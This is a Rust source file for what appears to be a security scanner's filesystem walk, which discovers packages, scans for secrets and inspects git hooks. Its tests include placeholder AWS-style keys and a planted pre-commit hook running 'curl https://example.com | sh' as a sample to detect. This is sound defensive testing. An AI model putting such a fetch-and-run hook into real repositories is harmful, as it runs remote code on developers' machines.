//! The one parallel, prune-aware filesystem walk behind every scan stage.
//!
//! Each file is visited once and dispatched to whichever registries the
//! [`WalkMode`] enables: package discovery (the [`ScanTarget`] registry)
//! and/or local detections (the [`Check`](crate::scan::checks::Check)
//! registry). `.git` directories are collected along the way for the hook scan
//! (nested repositories included), and one prune list decides what is skipped.

use crate::cache::ScanCache;
use crate::model::{Finding, PackageRef, ScanOptions};
use crate::scan::local;
use crate::scan::targets::{self, ScanTarget};
use anyhow::Result;
use ignore::{DirEntry, WalkBuilder, WalkState};
use std::collections::HashSet;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU64, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};

/// Which registries a walk feeds.
#[derive(Clone, Copy)]
pub(crate) enum WalkMode {
    /// Package discovery only ([`discover_packages`]).
    Packages,
    /// Local checks + the git-hook scan only (quick pass, home inventory).
    Checks,
    /// Both registries in one pass: the main scan stage.
    Both,
}

impl WalkMode {
    fn packages(self) -> bool {
        matches!(self, WalkMode::Packages | WalkMode::Both)
    }
    fn checks(self) -> bool {
        matches!(self, WalkMode::Checks | WalkMode::Both)
    }
}

/// Everything one walk produced. Fields the mode didn't enable stay empty/zero.
#[derive(Default)]
pub(crate) struct WalkOutput {
    pub findings: Vec<Finding>,
    /// Deduplicated per coordinate + manifest (the same name@version in two
    /// sibling projects' lockfiles must yield one entry each).
    pub packages: Vec<PackageRef>,
    /// Manifests that matched a target but could not be read or parsed
    /// (`path: reason` per entry), surfaced as a scan diagnostic.
    pub warnings: Vec<String>,
    pub files_checked: usize,
    pub cache_hits: usize,
    pub bytes_scanned: u64,
    pub workers: usize,
}

/// Discover package coordinates under `roots`: the walk in package-discovery
/// mode, exposed as the crate's standalone discovery API.
pub fn discover_packages(roots: &[PathBuf]) -> Result<Vec<PackageRef>> {
    let options = ScanOptions::new(roots.to_vec());
    Ok(walk(roots, &options, WalkMode::Packages, |_, _| {}, |_| {}).packages)
}

/// Walk `roots` once, dispatching every file to the registries `mode` enables.
///
/// `progress` fires per visited file with the running count. `on_findings`
/// fires with the accumulated findings each time a file yields new ones.
/// Naturally sparse; the caller throttles publishing.
pub(crate) fn walk(
    roots: &[PathBuf],
    options: &ScanOptions,
    mode: WalkMode,
    progress: impl Fn(&Path, usize) + Send + Sync,
    on_findings: impl Fn(&[Finding]) + Send + Sync,
) -> WalkOutput {
    let walker = Walker {
        options,
        mode,
        registry: mode.packages().then(targets::default_targets),
        // The index is a pure rescan-speed cache: failing to open it (a locked
        // db from a concurrent husk process, a corrupt file) must never fail
        // the scan itself; degrade to a full uncached scan instead. Opening
        // loads the whole index into memory in one query; the per-file path
        // then never touches SQLite (see `ScanCache`).
        scan_index: mode
            .checks()
            .then(|| ScanCache::open(options.max_file_bytes).ok())
            .flatten(),
        sink: Sink::default(),
        progress,
        on_findings,
    };
    // `.git` directories seen during the traversal, for the hook scan. An Arc
    // because `filter_entry` requires a `'static` filter.
    let git_dirs = Arc::new(Mutex::new(Vec::new()));

    for root in roots {
        if options.cancel.load(std::sync::atomic::Ordering::Relaxed) {
            break;
        }
        if root.is_file() {
            walker.process(root);
            continue;
        }

        let mut builder = WalkBuilder::new(root);
        let git_dirs_for_filter = mode.checks().then(|| git_dirs.clone());
        builder
            .standard_filters(false)
            .hidden(false)
            .parents(false)
            .ignore(false)
            .git_ignore(false)
            .git_global(false)
            .git_exclude(false)
            .follow_links(false)
            .filter_entry(move |entry| {
                if let Some(git_dirs) = &git_dirs_for_filter
                    && entry.file_type().map(|ft| ft.is_dir()).unwrap_or(false)
                    && entry.file_name() == ".git"
                {
                    lock(git_dirs).push(entry.path().to_path_buf());
                }
                keep_entry(entry)
            });

        builder.build_parallel().run(|| {
            Box::new(|entry| {
                // A stop asked for mid-walk: quit the traversal and keep what
                // the sink already collected.
                if options.cancel.load(std::sync::atomic::Ordering::Relaxed) {
                    return WalkState::Quit;
                }
                let Ok(entry) = entry else {
                    return WalkState::Continue;
                };
                if !entry.file_type().map(|ft| ft.is_file()).unwrap_or(false) {
                    return WalkState::Continue;
                }
                walker.process(entry.path());
                WalkState::Continue
            })
        });
    }

    // Hooks inside every `.git` directory the walk saw, nested repositories
    // included, which is exactly why this runs off the walk's collection
    // instead of only checking `<root>/.git`.
    if mode.checks() {
        let mut git_dirs = std::mem::take(&mut *lock(&git_dirs));
        git_dirs.sort();
        git_dirs.dedup();
        let mut hook_findings = Vec::new();
        for git_dir in git_dirs {
            local::scan_git_hooks(&git_dir, options, &mut hook_findings);
        }
        // A `core.hooksPath` set in global config resolves to the same directory
        // for every repository under the scan root, so the same script is
        // reached once per repo; dedupe on the script path to report it once.
        let mut seen = HashSet::new();
        hook_findings.retain(|finding| seen.insert(finding.path.clone()));
        lock(&walker.sink.findings).extend(hook_findings);
    }

    // The walk's only SQLite write: every freshly scanned file goes back to
    // the index in one transaction (sequential stages each open their own
    // `ScanCache`, so the next walk's bulk load sees these rows).
    if let Some(scan_index) = &walker.scan_index {
        scan_index.flush();
    }

    walker.into_output()
}

/// The per-walk state shared by every worker thread.
struct Walker<'a, P, F> {
    options: &'a ScanOptions,
    mode: WalkMode,
    registry: Option<Vec<Box<dyn ScanTarget>>>,
    scan_index: Option<ScanCache>,
    sink: Sink,
    progress: P,
    on_findings: F,
}

#[derive(Default)]
struct Sink {
    findings: Mutex<Vec<Finding>>,
    packages: Mutex<Vec<PackageRef>>,
    warnings: Mutex<Vec<String>>,
    /// Length of the last snapshot handed to `on_findings`: the publish gate
    /// that keeps concurrent workers from publishing stale snapshots.
    published: Mutex<usize>,
    files_checked: AtomicUsize,
    cache_hits: AtomicUsize,
    bytes_scanned: AtomicU64,
}

/// Lock a sink mutex, absorbing poison: a panicked worker must not take the
/// whole walk's results down with it.
fn lock<T>(mutex: &Mutex<T>) -> std::sync::MutexGuard<'_, T> {
    mutex.lock().unwrap_or_else(|poison| poison.into_inner())
}

impl<P, F> Walker<'_, P, F>
where
    P: Fn(&Path, usize) + Send + Sync,
    F: Fn(&[Finding]) + Send + Sync,
{
    /// Visit one file: count it, then run whichever registries the mode
    /// enables against it.
    fn process(&self, path: &Path) {
        let count = self.sink.files_checked.fetch_add(1, Ordering::Relaxed) + 1;
        (self.progress)(path, count);

        if let Some(registry) = &self.registry {
            let mut packages = Vec::new();
            let mut warnings = Vec::new();
            targets::discover_from_file(registry, path, &mut packages, &mut warnings);
            if !packages.is_empty() {
                lock(&self.sink.packages).extend(packages);
            }
            if !warnings.is_empty() {
                lock(&self.sink.warnings).extend(warnings);
            }
        }

        if self.mode.checks() {
            let mut findings = Vec::new();
            let outcome =
                local::scan_file(path, self.options, self.scan_index.as_ref(), &mut findings);
            if outcome.cache_hit {
                self.sink.cache_hits.fetch_add(1, Ordering::Relaxed);
            }
            self.sink
                .bytes_scanned
                .fetch_add(outcome.bytes_scanned, Ordering::Relaxed);
            if !findings.is_empty() {
                // Publish OUTSIDE the findings lock: the callback re-scores/
                // publishes the whole report, and holding the findings mutex
                // across it would stall every other walker thread with
                // findings to add.
                let snapshot = {
                    let mut all = lock(&self.sink.findings);
                    all.extend(findings);
                    all.clone()
                };
                // Publishes must be ordered: the callback replaces the whole
                // downstream report, so a stale snapshot overwrites a newer
                // one. Findings only ever grow, making snapshot length a
                // generation number; a dedicated mutex held across the
                // callback serializes publishes and drops stale snapshots.
                let mut published = lock(&self.sink.published);
                if snapshot.len() > *published {
                    *published = snapshot.len();
                    (self.on_findings)(&snapshot);
                }
            }
        }
    }

    fn into_output(self) -> WalkOutput {
        let sink = self.sink;
        let mut packages = std::mem::take(&mut *lock(&sink.packages));
        // Dedupe per manifest, not per coordinate: the same name@version in two
        // sibling projects' lockfiles must yield one entry each, or the second
        // project's packages (and every finding on them) silently vanish.
        let mut seen = HashSet::new();
        packages.retain(|package| seen.insert((package.key(), package.manifest_path.clone())));
        let findings = std::mem::take(&mut *lock(&sink.findings));
        let warnings = std::mem::take(&mut *lock(&sink.warnings));
        WalkOutput {
            findings,
            packages,
            warnings,
            files_checked: sink.files_checked.into_inner(),
            cache_hits: sink.cache_hits.into_inner(),
            bytes_scanned: sink.bytes_scanned.into_inner(),
            workers: std::thread::available_parallelism()
                .map(usize::from)
                .unwrap_or(1),
        }
    }
}

/// The single prune list: content directories no consumer ever wants to
/// descend into. (`.git` is pruned from *descent* but still recorded above as
/// a hook-scan root.)
///
/// Installed dependency trees (`node_modules`, `vendor`, `site-packages`, …)
/// are here because their contents are not authored in this project: a local
/// finding inside one is a report about somebody else's code that the developer
/// cannot fix by editing the file, and vendored test fixtures are the largest
/// single source of false-positive secrets. Their *coordinates* are still
/// scanned in full, because discovery reads the lockfile at the project root,
/// which enumerates every package the pruned tree materialises.
///
/// `.husk` is husk's own state: `husk fix` snapshots every file it edits under
/// `.husk/backups/<ts>/files/`, so walking it rescans copies of files already
/// scanned in place, once per fix run. The committed `.husk/policy.toml` is
/// found by walking *up* from the scan roots ([`crate::policy`]), never by this
/// walk, so pruning the directory costs nothing.
fn keep_entry(entry: &DirEntry) -> bool {
    if !entry.file_type().map(|ft| ft.is_dir()).unwrap_or(false) {
        return true;
    }
    if is_agent_runtime_dir(entry.path()) {
        return false;
    }
    let name = entry.file_name().to_string_lossy();
    !matches!(
        name.as_ref(),
        ".direnv"
            | ".husk"
            | ".git"
            | ".hg"
            | ".svn"
            | ".next"
            | ".turbo"
            | "target"
            | "node_modules"
            | "vendor"
            | "site-packages"
            | "dist"
            | "build"
            | "coverage"
            | "__pycache__"
            | ".venv"
            | "venv"
    )
}

/// A coding-agent chat-transcript / tool-log / session subtree under an agent's
/// home dir (`~/.claude/projects`, `~/.claude/shell-snapshots`, `~/.cursor/logs`,
/// …). These hold the user's own private conversation history, not config an
/// agent re-reads; scanning them floods a first-run report with prompt-injection
/// noise quoting the user's private chats (and leaks those snippets as evidence).
/// Scoped to known agent homes so a normal `~/projects` is never pruned. The
/// home/runtime-dir lists are shared with the prompt-injection check via
/// [`super::agent_paths`] so the two never drift apart.
fn is_agent_runtime_dir(path: &Path) -> bool {
    super::agent_paths::in_agent_runtime_subtree(path)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    #[test]
    fn same_coordinate_in_sibling_projects_keeps_one_entry_per_manifest() {
        // Two sibling projects locking the same name@version must both surface
        // it, or the second project's findings silently vanish.
        let dir = tempfile::tempdir().expect("tempdir");
        let lock = r#"{"name":"x","lockfileVersion":3,"packages":{"node_modules/lodash":{"version":"4.17.20"}}}"#;
        for project in ["a", "b"] {
            let root = dir.path().join(project);
            fs::create_dir(&root).expect("mkdir");
            fs::write(root.join("package-lock.json"), lock).expect("write lockfile");
        }

        let packages = discover_packages(&[dir.path().to_path_buf()]).expect("discover packages");
        let lodash: Vec<_> = packages
            .iter()
            .filter(|p| p.key() == "npm:lodash@4.17.20")
            .collect();
        assert_eq!(lodash.len(), 2, "one entry per manifest, got {lodash:?}");
    }

    #[test]
    fn agent_runtime_subtrees_are_pruned_from_the_walk() {
        // A lockfile inside an agent runtime subtree (`.claude/projects/…`) must
        // be pruned, while an identically-named dir outside an agent home
        // (`projects/…`) stays eligible.
        let dir = tempfile::tempdir().expect("tempdir");
        let lock = r#"{"name":"x","lockfileVersion":3,"packages":{"node_modules/lodash":{"version":"4.17.20"}}}"#;

        let pruned = dir.path().join(".claude/projects/app");
        fs::create_dir_all(&pruned).expect("mkdir pruned");
        fs::write(pruned.join("package-lock.json"), lock).expect("write pruned lockfile");

        let kept = dir.path().join("projects/app");
        fs::create_dir_all(&kept).expect("mkdir kept");
        fs::write(kept.join("package-lock.json"), lock).expect("write kept lockfile");

        let packages = discover_packages(&[dir.path().to_path_buf()]).expect("discover packages");
        let manifests: Vec<_> = packages
            .iter()
            .filter(|p| p.key() == "npm:lodash@4.17.20")
            .map(|p| p.manifest_path.clone())
            .collect();
        assert_eq!(
            manifests.len(),
            1,
            "only the non-agent lockfile is discovered, got {manifests:?}"
        );
        assert!(manifests[0].starts_with(dir.path().join("projects")));
    }

    #[test]
    fn husk_fix_backups_are_pruned_from_the_walk() {
        // `husk fix` snapshots each file it edits under `.husk/backups/<ts>/`.
        // Walking those rescans the same file once per fix run, and every copy
        // is a duplicate finding pointing at a path that rollback deletes.
        let dir = tempfile::tempdir().expect("tempdir");
        let lock = r#"{"name":"x","lockfileVersion":3,"packages":{"node_modules/lodash":{"version":"4.17.20"}}}"#;
        fs::write(dir.path().join("package-lock.json"), lock).expect("write lockfile");

        let backup = dir.path().join(".husk/backups/20260712T150304Z/files/app");
        fs::create_dir_all(&backup).expect("mkdir backup");
        fs::write(backup.join("package-lock.json"), lock).expect("write snapshot");

        let packages = discover_packages(&[dir.path().to_path_buf()]).expect("discover packages");
        let manifests: Vec<_> = packages
            .iter()
            .filter(|p| p.key() == "npm:lodash@4.17.20")
            .map(|p| p.manifest_path.clone())
            .collect();
        assert_eq!(
            manifests,
            vec![dir.path().join("package-lock.json")],
            "only the live lockfile is discovered, got {manifests:?}"
        );
    }

    #[test]
    fn installed_dependency_trees_are_pruned_from_checks_but_not_from_coordinates() {
        // A secret inside a vendored tree is somebody else's file (usually a
        // test fixture) and is pure noise, while the packages that tree
        // materialises must still be scanned: discovery gets them from the
        // lockfile at the project root, which is not pruned.
        let temp = tempfile::tempdir().expect("tempdir");
        let root = temp.path().join("app");
        let lock = r#"{"name":"x","lockfileVersion":3,"packages":{"node_modules/lodash":{"version":"4.17.20"}}}"#;
        for tree in [
            "node_modules",
            "vendor",
            ".venv/lib/python3.12/site-packages",
        ] {
            let dir = root.join(tree).join("pkg/test");
            fs::create_dir_all(&dir).expect("mkdir vendored tree");
            fs::write(dir.join("fixture.txt"), "key = AKIA0123456789ABCDEF\n").expect("fixture");
        }
        fs::create_dir_all(&root).expect("mkdir root");
        fs::write(root.join("package-lock.json"), lock).expect("write lockfile");
        fs::write(root.join("leak.txt"), "key = AKIAFFFFFFFFFFFFFFFF\n").expect("write leak");

        let options = ScanOptions::new(vec![temp.path().to_path_buf()]);
        let result = walk(&options.roots, &options, WalkMode::Both, |_, _| {}, |_| {});

        let paths: Vec<_> = result
            .findings
            .iter()
            .filter_map(|f| f.path.clone())
            .collect();
        assert!(
            paths.iter().any(|path| path.ends_with("leak.txt")),
            "the project's own secret is still reported, got {paths:?}"
        );
        assert!(
            !paths
                .iter()
                .any(|path| path.to_string_lossy().contains("fixture.txt")),
            "vendored fixtures must not produce findings, got {paths:?}"
        );
        assert!(
            result
                .packages
                .iter()
                .any(|p| p.key() == "npm:lodash@4.17.20"),
            "pruning the installed tree must not lose its coordinates"
        );
    }

    #[test]
    fn one_walk_scans_nested_git_hooks_and_discovers_packages() {
        // The main scan stage runs discovery + checks fused (`WalkMode::Both`).
        // A repo nested below the scan root must still get its hooks scanned
        // (its `.git` is pruned from descent but recorded as a hook root), and
        // its lockfile must surface as coordinates, from the same single walk.
        let temp = tempfile::tempdir().expect("tempdir");
        let nested = temp.path().join("projects/app");
        let hooks = nested.join(".git/hooks");
        fs::create_dir_all(&hooks).expect("hooks dir");
        fs::write(nested.join("README.md"), "hello").expect("readme");
        fs::write(hooks.join("pre-commit"), "curl https://example.com | sh").expect("hook");
        let lock = r#"{"name":"x","lockfileVersion":3,"packages":{"node_modules/lodash":{"version":"4.17.20"}}}"#;
        fs::write(nested.join("package-lock.json"), lock).expect("write lockfile");

        let options = ScanOptions::new(vec![temp.path().to_path_buf()]);
        let result = walk(&options.roots, &options, WalkMode::Both, |_, _| {}, |_| {});

        assert!(result.findings.iter().any(|finding| {
            finding.id == "git-hook"
                && finding
                    .path
                    .as_ref()
                    .is_some_and(|path| path.ends_with(".git/hooks/pre-commit"))
        }));
        assert!(
            result
                .packages
                .iter()
                .any(|p| p.key() == "npm:lodash@4.17.20")
        );
    }

    #[test]
    fn checks_mode_scans_git_hooks_in_nested_repositories() {
        let temp = tempfile::tempdir().expect("tempdir");
        let nested = temp.path().join("projects/app");
        let hooks = nested.join(".git/hooks");
        fs::create_dir_all(&hooks).expect("hooks dir");
        fs::write(nested.join("README.md"), "hello").expect("readme");
        fs::write(hooks.join("pre-commit"), "curl https://example.com | sh").expect("hook");

        let options = ScanOptions::new(vec![temp.path().to_path_buf()]);
        let result = walk(
            &options.roots,
            &options,
            WalkMode::Checks,
            |_, _| {},
            |_| {},
        );

        assert!(result.findings.iter().any(|finding| {
            finding.id == "git-hook"
                && finding
                    .path
                    .as_ref()
                    .is_some_and(|path| path.ends_with(".git/hooks/pre-commit"))
        }));
        assert!(result.packages.is_empty());
    }

    #[test]
    fn findings_snapshots_publish_in_strictly_increasing_order() {
        // The on_findings callback replaces the whole downstream report, so a
        // stale snapshot published after a newer one silently drops findings.
        // Findings only grow: whatever the worker interleaving, published
        // snapshot sizes must be strictly increasing and the largest one must
        // carry every finding.
        let temp = tempfile::tempdir().expect("tempdir");
        for i in 0..8 {
            fs::write(
                temp.path().join(format!("leak-{i}.txt")),
                format!("key = AKIA{i:016X}\n"),
            )
            .expect("write secret file");
        }

        let published = Mutex::new(Vec::new());
        let options = ScanOptions::new(vec![temp.path().to_path_buf()]);
        let result = walk(
            &options.roots,
            &options,
            WalkMode::Checks,
            |_, _| {},
            |snapshot| lock(&published).push(snapshot.len()),
        );

        let published = lock(&published);
        assert!(!published.is_empty(), "secret files must publish snapshots");
        assert!(
            published.windows(2).all(|pair| pair[0] < pair[1]),
            "published snapshot sizes must be strictly increasing: {published:?}"
        );
        assert_eq!(
            *published.last().expect("nonempty"),
            result.findings.len(),
            "the last published snapshot carries every finding"
        );
    }
}
